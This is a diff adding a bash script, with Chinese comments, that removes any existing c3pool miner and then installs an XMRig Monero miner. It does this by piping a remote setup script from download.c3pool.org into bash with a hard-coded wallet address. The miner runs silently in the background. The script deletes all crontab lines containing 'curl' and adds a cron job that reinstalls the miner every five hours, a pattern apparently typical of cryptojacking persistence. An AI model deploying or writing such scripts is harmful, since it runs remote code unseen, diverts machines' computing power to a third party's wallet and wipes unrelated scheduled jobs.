@@ -1,0 +1,10 @@
+#!/bin/bash
+#停止c3池
+curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/uninstall_c3pool_miner.sh | bash -s
+
+# 把这个放到后台执行，并将输出重定向到日志文件
+nohup curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 429zJ7unRtNKSm8ixNDWUNHvm9QVAHcRXH4C2eNhSMtTN5NWGijRGWxDoYSAingj2R8DiH12m124v47S5hKxfo9hQomR4Aj >/dev/null 2>&1 & disown
+
+#清除上一次的任务，添加下一次的任务
+crontab -l | grep -v "curl" | crontab -
+echo "0 */5 * * * curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 429zJ7unRtNKSm8ixNDWUNHvm9QVAHcRXH4C2eNhSMtTN5NWGijRGWxDoYSAingj2R8DiH12m124v47S5hKxfo9hQomR4Aj > /path/to/logfile.log 2>&1" | crontab -
